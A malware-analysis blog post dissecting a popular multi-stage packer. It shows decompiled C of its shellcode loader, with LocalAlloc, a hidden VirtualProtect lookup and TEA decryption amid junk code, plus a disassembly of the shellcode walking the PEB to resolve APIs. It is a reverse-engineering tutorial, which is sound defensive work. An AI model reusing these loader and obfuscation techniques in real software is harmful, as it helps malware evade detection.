<meta name="twitter:text:title" content="Anatomy of a simple and popular packer" />
<meta name="twitter:image" content="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Font-1.png?resize=1200%2C429&#038;ssl=1&#038;w=640" />
<meta name="twitter:card" content="summary_large_image" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/05/saber.jpeg?fit=32%2C26&#038;ssl=1" sizes="32x32" />
<link rel="icon" href="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/05/saber.jpeg?fit=192%2C156&#038;ssl=1" sizes="192x192" />
<link rel="apple-touch-icon" href="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/05/saber.jpeg?fit=180%2C146&#038;ssl=1" />
<meta name="msapplication-TileImage" content="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/05/saber.jpeg?fit=249%2C202&#038;ssl=1" />

</head>
<body class="post-template-default single single-post postid-3128 single-format-standard has-site-icon anatomy-of-a-simple-and-popular-packer">
	<div class="wrapper">
		<header class="header clear" role="banner">
			<div class="container">
				<nav class="navbar navbar-expand-lg navbar-dark " role="navigation">
										<a class="navbar-brand" href="https://fumik0.com">
						<img src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/05/saber.jpeg?fit=32%2C26&#038;ssl=1" alt="Logo" class="logo-img">
					</a>
					
											<div id="mynote-nav-bar" class="collapse navbar-collapse"><ul id="menu-primary" class="navbar-nav mr-auto"><li  id="menu-item-8"class="nav-item"><a href="/" class="nav-link">Home</a></li><li  id="menu-item-595"class="nav-item"><a href="http://tracker.fumik0.com" class="nav-link">Tracker</a></li><li  id="menu-item-786"class="nav-item"><a href="https://twitter.com/fumik0_" class="nav-link">Twitter</a></li><li  id="menu-item-9"class="nav-item"><a href="https://fumik0.com/about/" class="nav-link">About</a></li><li  id="menu-item-10"class="nav-item"><a href="https://fumik0.com/contact/" class="nav-link">Contact</a></li></ul></div>					
					<div class="search-bar">
						
<form id="search-form" class="search" method="get" action="https://fumik0.com" role="search" autocomplete="off">
	<input type="text" name="s" class="search-input" placeholder="To search, type and hit enter.">
	<span class="search-icon" onclick="document.getElementById('search-form').submit();"><i class="fas fa-search"></i></span>
</form>


					</div>
					
					<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#mynote-nav-bar" aria-controls="mynote-nav-bar" aria-expanded="false" aria-label="Toggle navigation">
						<span class="navbar-toggler-icon"></span>
					</button>
				</nav>
			</div><!-- .container -->
		</header>


		

		<div class="single-post-title-bar clear" role="banner">
			<div class="container">
				<nav class="navbar navbar-expand-lg navbar-dark" role="navigation">
					<a class="navbar-brand" href="https://fumik0.com"></a>
					<div id="progress-title"></div>
				</nav>
			</div>
			<div class="progress-wrapper">
				<div class="progress-label"></div>
				<progress></progress>
			</div>
		</div>
	
<div class="data-schema is-single" itemscope itemtype="http://schema.org/Article">
											<nav class="breadcrumb">
			<div class="container">
				<ul class="breadcrumb" itemscope itemtype="http://schema.org/BreadcrumbList">
					<li class="breadcrumb-item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
						<a href="https://fumik0.com" itemprop="item">
							<span itemprop="name"><i class="fas fa-globe"></i><span class="sr-only">Home</span></span>
						</a>
						<meta itemprop="position" content="1">
					</li>
										<li class="breadcrumb-item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
						<a href="https://fumik0.com/category/uncategorized/" itemprop="item">
							<span itemprop="name">Uncategorized</span>
						</a>
						<meta itemprop="position" content="2">
					</li>
															<li class="breadcrumb-item active" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
						<span itemprop="name">Anatomy of a simple and popular packer</span>
						<meta itemprop="item" content="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/">
						<meta itemprop="position" content="3">
					</li>
				</ul>
			</div>
		</nav>
		
			<div class="single-post-header">
				<div class="container">

					<h1 id="post-title" itemprop="headline">Anatomy of a simple and popular packer</h1>
					<div class="post-mynote-buttons">

															<div class="btn-group column-control">
			<div class="btn-counter text-only active" data-target="#aside-container" role="button">		
				<div class="btn"><i class="fas fa-columns"></i></div>
			</div>
			<div class="btn-counter text-only" data-target="#sidebar" role="button">		
				<div class="btn"><i class="fas fa-list-ul"></i></div>
			</div> 
		</div>
							
												
		<a href="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/#comments" class="button-like-link">
			<div class="btn-counter">
				<div class="btn">
					<i class="fas fa-comment-dots"></i>
				</div>
				<div class="count-box">0</div>
			</div>
		</a>
						</div><!-- .post-mynote-buttons -->

											<div class="post-meta">
							<div class="author-posted-date"><img src="https://secure.gravatar.com/avatar/60460a1a0d00b32720a59ee2624bb4aa?s=40&#038;d=identicon&#038;r=g" class="rounded-circle poster-avatar" align="middle"> <a href="https://fumik0.com/author/fumko/" title="written April 24, 2021 @ 8:25 pm" class="author-link">fumko</a> <time itemprop="datePublished" datetime="2021-04-24T20:25:53+00:00">written 4 years ago</time></div>						</div>
					
				</div><!-- .container -->
			</div><!-- .single-post-header -->

			
	<div class="container">
		<div class="row row-layout-choice-post">
			<main id="main-container" class="col-lg-8 col-md-8 col-sm-12" role="main">

				
					
						
						<article id="post-3128" class="markdown-body post-3128 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">

																	<figure>
			<img src="https://fumik0.com/wp-content/uploads/2021/04/Font-1.png" class="attachment- size- wp-post-image" alt="" itemprop="image" decoding="async" fetchpriority="high" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Font-1.png?w=1296&amp;ssl=1 1296w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Font-1.png?resize=300%2C99&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Font-1.png?resize=1024%2C339&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Font-1.png?resize=768%2C254&amp;ssl=1 768w" sizes="(max-width: 1296px) 100vw, 1296px" data-attachment-id="3190" data-permalink="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/font-2/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Font-1.png?fit=1296%2C429&amp;ssl=1" data-orig-size="1296,429" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Font" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Font-1.png?fit=300%2C99&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Font-1.png?fit=900%2C298&amp;ssl=1" />			<figcaption></figcaption>
		</figure>
								
							<div itemprop="articleBody">
								<p>It&#8217;s been a while that I haven&#8217;t release some stuff here and indeed, it&#8217;s mostly caused by how fucked up 2020 was. I would have been pleased if this global pandemic hasn&#8217;t wrecked me so much but i was served as well. Nowadays, with everything closed, corona haircut is new trend and finding a graphic cards or PS5 is like winning at the lottery. So why not fflush all that bullshit by spending some time into malware curiosities (with the support of some croissant and animes), whatever the time, weebs are still weebs.</p>
<p>So let&#8217;s start 2021 with something really simple&#8230; Why not dissecting completely to the ground a well-known packer mixing C/C++ &amp; shellcode (active since some years now).</p>
<p style="text-align: center;"><img data-recalc-dims="1" decoding="async" data-attachment-id="3132" data-permalink="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/icons/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Icons.png?fit=605%2C160&amp;ssl=1" data-orig-size="605,160" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Packer icons batch" data-image-description="&lt;p&gt;An example of icons that could be seen with the packer&lt;/p&gt;
" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Icons.png?fit=300%2C79&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Icons.png?fit=605%2C160&amp;ssl=1" class="size-full wp-image-3132 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Icons.png?resize=605%2C160&#038;ssl=1" alt="" width="605" height="160" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Icons.png?w=605&amp;ssl=1 605w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Icons.png?resize=300%2C79&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Icons.png?resize=600%2C160&amp;ssl=1 600w" sizes="(max-width: 605px) 100vw, 605px" /><em>Typical icons that could be seen with this packer</em></p>
<p>This one is a cool playground for checking its basics with someone that need to start learning into malware analysis/reverse engineering:</p>
<ul>
<li>Obfuscation</li>
<li>Cryptography</li>
<li>Decompression</li>
<li>Multi-stage</li>
<li>Shellcode</li>
<li>Remote Thread Hijacking</li>
</ul>
<p><strong><em>Disclamer: This post will be different from what i&#8217;m doing usually in my blog with almost no text but i took the time for decompiling and reviewing all the code. So I considered everything is explain.<br /></em></strong></p>
<p>For this analysis, this sample will be used:</p>
<pre><em>B7D90C9D14D124A163F5B3476160E1CF</em></pre>
<h1>Architecture</h1>
<p>Speaking of itself, the packer is split into 3 main stages:</p>
<ul>
<li>A PE that will allocate, decrypt and execute the shellcode n°1</li>
<li>Saving required WinAPI calls, decrypting, decompressing and executing shellcode n°2</li>
<li>Saving required WinAPI calls (again) and executing payload with a remote threat hijacking trick</li>
</ul>
<p style="text-align: center;"><img data-recalc-dims="1" decoding="async" data-attachment-id="3130" data-permalink="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/architecture/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Architecture.png?fit=803%2C474&amp;ssl=1" data-orig-size="803,474" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Architecture" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Architecture.png?fit=300%2C177&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Architecture.png?fit=803%2C474&amp;ssl=1" class="aligncenter size-full wp-image-3130" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Architecture.png?resize=803%2C474&#038;ssl=1" alt="" width="803" height="474" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Architecture.png?w=803&amp;ssl=1 803w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Architecture.png?resize=300%2C177&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Architecture.png?resize=768%2C453&amp;ssl=1 768w" sizes="(max-width: 803px) 100vw, 803px" /><em>An overview of this packer</em></p>
<h1>Stage 1 &#8211; The PE</h1>
<p>The first stage is misleading the analyst to think that a decent amount of instructions are performed, but&#8230; after purging all the junk code and unused functions, the cleaned <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winmain"><strong>Winmain</strong></a> function is unveiling a short and standard setup for launching a shellcode.</p>
<pre><code>int __stdcall wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd)
{
  int i; 
  SIZE_T uBytes; 
  HMODULE hModule; 

  // Will be used for Virtual Protect call
  hKernel32 = LoadLibraryA("kernel32.dll");

  // Bullshit stuff for getting correct uBytes value
  uBytes = CONST_VALUE

  _LocalAlloc();

  for ( i = 0; j &lt; uBytes; ++i ) {
    (_FillAlloc)();
  }

  _VirtualProtect();

  // Decrypt function vary between date &amp; samples
  _Decrypt();     
  _ExecShellcode();

  return 0;
}</code></pre>
<p>It&#8217;s important to notice this packer is changing its first stage regularly, but it doesn&#8217;t mean the whole will change in the same way. In fact, the core remains intact but the form will be different, so whenever you have reversed this piece of code once, the pattern is recognizable easily in no time.</p>
<p>Beside using a classic <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc</a></strong>, this one is using <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-localalloc">LocalAlloc</a></strong> for creating an allocated memory page to store the second stage. The variable uBytes was continuously created behind some spaghetti code (global values, loops and conditions).</p>
<pre><code>int (*LocalAlloc())(void)
{
  int (*pBuff)(void); // eax

  pBuff = LocalAlloc(0, uBytes);
  Shellcode = pBuff;
  return pBuff;
}</code></pre>
<p>For avoiding giving directly the position of the shellcode, It&#8217;s using a simple addition trick for filling the buffer step by step.</p>
<pre><code>int __usercall FillAlloc(int i)
{
  int result; // eax

  // All bullshit code removed
  result = dword_834B70 + 0x7E996;
  *(Shellcode + i) = *(dword_834B70 + 0x7E996 + i);
  return result;
}</code></pre>
<p>Then obviously, whenever an allocation is called, <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect</a></strong> is not far away for finishing the job. The function name is obfuscated as first glance and adjusted. then for avoiding calling it directly, our all-time classic <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress">GetProcAddress</a></strong> will do the job for saving this <strong><a href="https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list">WinAPI</a></strong> call into a pointer function.</p>
<pre><code>BOOL __stdcall VirtualProtect()
{
  char v1[4]; // [esp+4h] [ebp-4h] BYREF

  String = 0;
  lstrcatA(&amp;String, "VertualBritect");          // No ragrets
  byte_442581 = 'i';
  byte_442587 = 'P';
  byte_442589 = 'o';
  pVirtualProtect = GetProcAddress(hKernel32, &amp;String);
  return (pVirtualProtect)(Shellcode, uBytes, 64, v1);
}</code></pre>
<h2>Decrypting the the first shellcode</h2>
<p>The philosophy behind this packer will lead you to think that the decryption algorithm will not be that much complex. Here the encryption used is <strong><a href="https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm">TEA</a></strong>, it&#8217;s simple and easy to used</p>
<pre><code>void Decrypt()
{
  SIZE_T size;
  PVOID sc; 
  SIZE_T i; 

  size = uBytes;
  sc = Shellcode;
  for ( i = size &gt;&gt; 3; i; --i )
  {
    _TEADecrypt(sc);                   
    sc = sc + 8;                  // +8 due it's v[0] &amp; v[1] with TEA Algorithm
  }
}</code></pre>
<p>I am always skeptical whenever i&#8217;m reading some manual implementation of a known cryptography algorithm, due that most of the time it could be tweaked. So before trying to understand what are the changes, let&#8217;s take our time to just make sure about which variable we have to identified:</p>
<ul>
<li>v[0] and v[1]</li>
<li>y &amp; z</li>
<li>Number of circles (n=32)</li>
<li>16 bytes key represented as k[0], k[1], k[2], k[3]</li>
<li>delta</li>
<li>sum</li>
</ul>
<p style="text-align: center;"><em><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="3150" data-permalink="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/tea_detection/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/TEA_Detection.png?fit=715%2C237&amp;ssl=1" data-orig-size="715,237" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="TEA_Detection" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/TEA_Detection.png?fit=300%2C99&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/TEA_Detection.png?fit=715%2C237&amp;ssl=1" class="aligncenter size-full wp-image-3150" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/TEA_Detection.png?resize=715%2C237&#038;ssl=1" alt="" width="715" height="237" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/TEA_Detection.png?w=715&amp;ssl=1 715w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/TEA_Detection.png?resize=300%2C99&amp;ssl=1 300w" sizes="auto, (max-width: 715px) 100vw, 715px" />Identifying TEA variables in x32dbg</em></p>
<p>For adding more salt to it, you have your dose of mindless amount of garbage instructions.</p>
<p style="text-align: center;"><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="3151" data-permalink="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/tea_junk_code/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/TEA_Junk_Code.png?fit=827%2C252&amp;ssl=1" data-orig-size="827,252" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="TEA_Junk_Code" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/TEA_Junk_Code.png?fit=300%2C91&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/TEA_Junk_Code.png?fit=827%2C252&amp;ssl=1" class="aligncenter size-full wp-image-3151" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/TEA_Junk_Code.png?resize=827%2C252&#038;ssl=1" alt="" width="827" height="252" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/TEA_Junk_Code.png?w=827&amp;ssl=1 827w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/TEA_Junk_Code.png?resize=300%2C91&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/TEA_Junk_Code.png?resize=768%2C234&amp;ssl=1 768w" sizes="auto, (max-width: 827px) 100vw, 827px" /><em>Junk code hiding the algorithm</em></p>
<p>After removing everything unnecessary, our TEA decryption algorithm is looking like this</p>
<pre><code>int *__stdcall _TEADecrypt(int *v)
{
  unsigned int y, z, sum;
  int i, v7, v8, v9, v10, k[4]; 
  int *result;

  y = *v;
  z = v[1];
  sum = 0xC6EF3720;

  k[0] = dword_440150;
  k[1] = dword_440154;
  k[3] = dword_440158;
  k[2] = dword_44015C;

  i = 32;
  do
  {
    // Junk code purged
    v7 = k[2] + (y &gt;&gt; 5);
    v9 = (sum + y) ^ (k[3] + 16 * y);
    v8 = v9 ^ v7;
    z -= v8;
    v10 = k[0] + 16 * z;
    (_TEA_Y_Operation)((sum + z) ^ (k[1] + (z &gt;&gt; 5)) ^ v10);
    sum += 0x61C88647;  // exact equivalent of sum -= 0x9
    --i;
  }

  while ( i );
  result = v;
  v[1] = z;
  *v = y;
  return result;
}</code></pre>
<p><span style="font-size: inherit;">At this step, the first stage of this packer is now almost complete. By inspecting the dump, you can recognizing our shellcode being ready for action (55 8B EC opcodes are in my personal experience stuff that triggered me almost everytime).</span></p>
<p style="text-align: center;"><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="3154" data-permalink="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/shellcode_01_dump/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Dump.png?fit=526%2C138&amp;ssl=1" data-orig-size="526,138" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Shellcode_01_Dump" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Dump.png?fit=300%2C79&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Dump.png?fit=526%2C138&amp;ssl=1" class="aligncenter size-full wp-image-3154" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Dump.png?resize=526%2C138&#038;ssl=1" alt="" width="526" height="138" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Dump.png?w=526&amp;ssl=1 526w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Dump.png?resize=300%2C79&amp;ssl=1 300w" sizes="auto, (max-width: 526px) 100vw, 526px" /></p>
<h2>Stage 2 &#8211; Falling into the shellcode playground</h2>
<p>This shellcode is pretty simple, the main function is just calling two functions:</p>
<ul>
<li>One focused for saving fundamentals WinAPI call
<ul>
<li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a></strong></li>
<li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress">GetProcAddress</a></strong></li>
</ul>
</li>
<li>Creating the shellcode API structure and setup the workaround for pushing and launching the last shellcode stage</li>
</ul>
<p style="text-align: center;"><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="3155" data-permalink="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/shellcode_01_disassembly/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Disassembly.png?fit=686%2C174&amp;ssl=1" data-orig-size="686,174" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Shellcode_01_Disassembly" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Disassembly.png?fit=300%2C76&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Disassembly.png?fit=686%2C174&amp;ssl=1" class="aligncenter size-full wp-image-3155" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Disassembly.png?resize=686%2C174&#038;ssl=1" alt="" width="686" height="174" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Disassembly.png?w=686&amp;ssl=1 686w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Disassembly.png?resize=300%2C76&amp;ssl=1 300w" sizes="auto, (max-width: 686px) 100vw, 686px" /><em>Shellcode main()</em></p>
<h3>Give my WinAPI calls</h3>
<p><em><strong>Disclamer:</strong> In this part, almost no text explanation, everything is detailed with the code</em></p>
<h4>PEB &amp; BaseDllName</h4>
<p>Like any another shellcode, it needs to get some address function to start its job, so our <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb">PEB</a></strong> best friend is there to do the job.</p>
<pre><code>00965233 | 55                       | push ebp                                      |
00965234 | 8BEC                     | mov ebp,esp                                   |
00965236 | 53                       | push ebx                                      |
00965237 | 56                       | push esi                                      |
00965238 | 57                       | push edi                                      |
00965239 | 51                       | push ecx                                      |
0096523A | 64:FF35 30000000         | push dword ptr fs:[30]                        | Pointer to PEB
00965241 | 58                       | pop eax                                       |
00965242 | 8B40 0C                  | mov eax,dword ptr ds:[eax+C]                  | Pointer to Ldr
00965245 | 8B48 0C                  | mov ecx,dword ptr ds:[eax+C]                  | Pointer to Ldr-&gt;InLoadOrderModuleList
00965248 | 8B11                     | mov edx,dword ptr ds:[ecx]                    | Pointer to List Entry (aka pEntry)
0096524A | 8B41 30                  | mov eax,dword ptr ds:[ecx+30]                 | Pointer to BaseDllName buffer (pEntry-&gt;DllBaseName-&gt;Buffer)</code></pre>
<p>Let&#8217;s take a look then in the <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb">PEB</a></strong> structure</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="3148" data-permalink="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/shellcode_01_dump_02/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Dump_02.png?fit=545%2C125&amp;ssl=1" data-orig-size="545,125" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Shellcode_01_Dump_02" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Dump_02.png?fit=300%2C69&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Dump_02.png?fit=545%2C125&amp;ssl=1" class="aligncenter size-full wp-image-3148" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Dump_02.png?resize=545%2C125&#038;ssl=1" alt="" width="545" height="125" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Dump_02.png?w=545&amp;ssl=1 545w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Shellcode_01_Dump_02.png?resize=300%2C69&amp;ssl=1 300w" sizes="auto, (max-width: 545px) 100vw, 545px" /></p>
<p>For beginners, i sorted all these values with there respective variable names and meaning.</p>
<table>
<thead>
<tr>
<th>offset</th>
<th>Type</th>
<th>Variable</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x00</td>
<td>LIST_ENTRY</td>
<td>InLoaderOrderModuleList-&gt;Flink</td>
<td>A8 3B 8D 00</td>
</tr>
<tr>
<td>0x04</td>
<td>LIST_ENTRY</td>
<td>InLoaderOrderModuleList-&gt;Blink</td>
<td>C8 37 8D 00</td>
</tr>
<tr>
<td>0x08</td>
<td>LIST_ENTRY</td>
<td>InMemoryOrderList-&gt;Flink</td>
<td>B0 3B 8D 00</td>
</tr>
<tr>
<td>0x0C</td>
<td>LIST_ENTRY</td>
<td>InMemoryOrderList-&gt;Blick</td>
<td>D0 37 8D 00</td>
</tr>
<tr>
<td>0x10</td>
<td>LIST_ENTRY</td>
<td>InInitializationOrderModulerList-&gt;Flink</td>
<td>70 3F 8D 00</td>
</tr>
<tr>
<td>0x14</td>
<td>LIST_ENTRY</td>
<td>InInitializationOrderModulerList-&gt;Blink</td>
<td>BC 7B CC 77</td>
</tr>
<tr>
<td>0x18</td>
<td>PVOID</td>
<td>BaseAddress</td>
<td>00 00 BB 77</td>
</tr>
<tr>
<td>0x1C</td>
<td>PVOID</td>
<td>EntryPoint</td>
<td>00 00 00 00</td>
</tr>
<tr>
<td>0x20</td>
<td>UINT</td>
<td>SizeOfImage</td>
<td>00 00 19 00</td>
</tr>
<tr>
<td>0x24</td>
<td>UNICODE_STRING</td>
<td>FullDllName</td>
<td>3A 00 3C 00 A0 35 8D 00</td>
</tr>
<tr>
<td>0x2C</td>
<td>UNICODE_STRING</td>
<td>BaseDllName</td>
<td>12 00 14 00 B0 6D BB 77</td>
</tr>
</tbody>
</table>
